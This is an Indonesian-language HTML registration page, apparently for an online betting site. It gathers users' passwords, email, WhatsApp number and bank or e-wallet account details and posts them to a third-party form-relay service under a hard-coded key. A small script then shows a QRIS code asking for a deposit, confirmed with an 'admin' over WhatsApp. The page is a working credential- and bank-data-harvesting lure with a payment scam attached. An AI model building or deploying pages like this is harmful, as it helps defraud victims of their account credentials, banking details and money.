<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Daftar Akun Baru</title>
    <style>
        body { background-color: #1a2639; color: white; font-family: sans-serif; display: flex; justify-content: center; padding: 20px; margin: 0; }
        .container { background: #25334a; width: 100%; max-width: 450px; border-radius: 4px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
        .header { background: #c5a059; padding: 15px; font-weight: bold; font-size: 16px; color: #fff; text-align: center; text-transform: uppercase; }
        form { padding: 20px; }
        .section-title { border-left: 3px solid #c5a059; padding-left: 10px; margin: 20px 0 10px; font-size: 14px; font-weight: bold; text-transform: uppercase; color: #c5a059; }
        label { display: block; font-size: 13px; margin-bottom: 5px; color: #fff; font-weight: bold; }
        input, select { width: 100%; padding: 10px; margin-bottom: 5px; border: 1px solid #444; background: #fff; color: #333; border-radius: 4px; box-sizing: border-box; }
        .hint { font-size: 11px; color: #bdc3c7; margin-bottom: 15px; }
        .btn-submit { background-color: #5c7cfa; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 10px; }
        #successSection { display: none; text-align: center; background: white; color: #333; padding: 30px 15px; }
        #successSection img { width: 100%; max-width: 300px; margin: 15px 0; border: 1px solid #ccc; display: block; margin-left: auto; margin-right: auto; }
    </style>
</head>
<body>

<div class="container">
    <div id="formSection">
        <div class="header">DAFTAR AKUN BARU</div>
        <form action="https://api.web3forms.com/submit" method="POST">
            <input type="hidden" name="access_key" value="c74c4a87-2a3b-4a2f-9483-f9b48f23981d">
            <input type="hidden" name="redirect" value="https://gamestar388-sketch.github.io/nesiabetting/#done">
            <input type="checkbox" name="botcheck" style="display: none;">

            <div class="section-title">Rincian Akun</div>
            <label>Nama Pengguna</label>
            <input type="text" name="user_id" required placeholder="Contoh: hoki88">
            <div class="hint">* 6-12 karakter</div>

            <label>Kata Sandi</label>
            <input type="password" name="p_word_secure" required>

            <div class="section-title">Kontak Info</div>
            <label>Alamat Email</label>
            <input type="email" name="user_email" required>

            <label>Nomor WhatsApp</label>
            <input type="number" name="wa_number" required>

            <div class="section-title">Informasi Bank / E-Wallet</div>
            <label>Nama Sesuai Rekening</label>
            <input type="text" name="sender_name" required>

            <label>Pilih Bank / E-Wallet</label>
            <select name="bank_type" required>
                <option value="">-- PILIH BANK --</option>
                <option value="BCA">BCA</option>
                <option value="BRI">BRI</option>
                <option value="MANDIRI">MANDIRI</option>
                <option value="BNI">BNI</option>
                <option value="BANK JAGO">BANK JAGO</option>
                <option value="SEABANK">SEABANK</option>
                <option value="ALLO BANK">ALLO BANK</option>
                <option value="">-- PILIH E-WALLET --</option>
                <option value="DANA">DANA</option>
                <option value="OVO">OVO</option>
                <option value="GOPAY">GOPAY</option>
                <option value="LINKAJA">LINKAJA</option>
                <option value="SHOPEEPAY">SHOPEEPAY</option>
            </select>

            <label>No. Rekening / HP</label>
            <input type="number" name="account_number" required>

            <button type="submit" class="btn-submit">DAFTAR SEKARANG</button>
        </form>
    </div>

    <div id="successSection">
        <h2 style="color: #2ecc71;">PENDAFTARAN BERHASIL!</h2>
        <p>Silakan Scan QRIS di bawah ini untuk Deposit:</p>
        
        <img src="https://lh3.googleusercontent.com/d/1vC-t8XqQ8XQ-w-Z8N8Z8N8Z8N8Z8N8Z8" alt="QRIS Nemoshop">
        
        <p style="font-weight: bold;">Setelah transfer, konfirmasi ke Admin via WA.</p>
        <button onclick="window.location.href='index.html'" style="padding: 10px; cursor: pointer; border-radius: 4px; width: 100%;">Kembali Ke Depan</button>
    </div>
</div>

<script>
    // Memunculkan QRIS setelah daftar sukses
    if(window.location.hash === '#done') {
        document.getElementById('formSection').style.display = 'none';
        document.getElementById('successSection').style.display = 'block';
    }
</script>

</body>
</html>
